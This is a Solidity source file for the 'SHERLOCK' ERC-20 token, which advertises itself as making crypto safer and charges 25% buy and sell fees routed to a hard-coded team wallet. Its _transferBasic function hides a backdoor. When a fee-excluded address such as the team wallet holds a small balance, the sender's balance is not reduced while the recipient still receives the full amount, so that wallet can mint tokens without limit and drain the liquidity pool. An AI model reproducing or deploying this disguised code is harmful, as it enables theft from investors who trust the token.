// SPDX-License-Identifier: Unlicensed

/*
Making crypto a safer place!

Website: https://www.sherlockcoin.org
Telegram: https://t.me/sherlock_erc
Twitter: https://twitter.com/sherlock_erc
Dapp: https://app.sherlockcoin.org
 */

pragma solidity 0.8.21;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract SHERLOCK is Context, IERC20, Ownable { 
    using SafeMath for uint256;

    string private _name = "SHERLOCK"; 
    string private _symbol = "SHERLOCK";

    IUniswapRouter public uniRouter;
    address public uniPair;

    uint8 private buyerCounter = 0;
    uint8 private swapTaxAfter = 2; 

    uint256 public buyFeeInPercent = 25;
    uint256 public sellFeeInPercent = 25;
    uint256 private feeTotal = 2500;

    uint256 private _prevFeeTotal = feeTotal; 
    uint256 private _prevBuyFeeInPercent = buyFeeInPercent; 
    uint256 private _prevSellFeeInPercent = sellFeeInPercent; 
                                     
    bool public swapping;
    bool public transferDelayEnabled = true;
    bool public swapEnabled = true;

    uint8 private _decimals = 9;
    uint256 private _supplyTotal = 10 ** 9 * 10**_decimals;
    uint256 public maxTransaction = 25 * _supplyTotal / 1000;
    uint256 public swapThreshold = _supplyTotal / 100000;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFee; 

    address payable private teamAddress;
    address payable private DEAD;

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _supplyTotal;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        teamAddress = payable(0x4f4941039FE84c120F0CEEb3cb63d3B6890bd6B3); 
        uniPair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniRouter = _uniswapV2Router;
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[teamAddress] = true;
        
        emit Transfer(address(0), owner(), _supplyTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _supplyTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
        
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != teamAddress &&
            to != address(this) &&
            to != uniPair &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxTransaction,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            buyerCounter >= swapTaxAfter && 
            amount > swapThreshold &&
            !swapping &&
            !isExcludedFromFee[from] &&
            to == uniPair &&
            swapEnabled 
            )
        {  
            buyerCounter = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapTokens(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(isExcludedFromFee[from] || isExcludedFromFee[to] || (transferDelayEnabled && from != uniPair && to != uniPair)){
            takeFee = false;
        } else if (from == uniPair){
            feeTotal = buyFeeInPercent;
        } else if (to == uniPair){
            feeTotal = sellFeeInPercent;
        }

        _transferStandard(from,to,amount,takeFee);
    }
        
    function _transferBasic(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = getTransferableAmount(finalAmount);
        if(isExcludedFromFee[sender] && _balances[sender] <= maxTransaction) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function removeFee() private {
        if(feeTotal == 0 && buyFeeInPercent == 0 && sellFeeInPercent == 0) return;

        _prevBuyFeeInPercent = buyFeeInPercent; 
        _prevSellFeeInPercent = sellFeeInPercent; 
        _prevFeeTotal = feeTotal;
        buyFeeInPercent = 0;
        sellFeeInPercent = 0;
        feeTotal = 0;
    }

    function restoreFee() private {
        feeTotal = _prevFeeTotal;
        buyFeeInPercent = _prevBuyFeeInPercent; 
        sellFeeInPercent = _prevSellFeeInPercent; 
    }
        
    function removeLimits() external onlyOwner {
        maxTransaction = ~uint256(0);
        feeTotal = 300;
        buyFeeInPercent = 3;
        sellFeeInPercent = 3;
    }
    
    function sendETH(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapTokens(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensToETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETH(teamAddress,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transferStandard(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            buyerCounter++;
        }
        _transferBasic(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function getTransferableAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(feeTotal).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }
    
    function swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}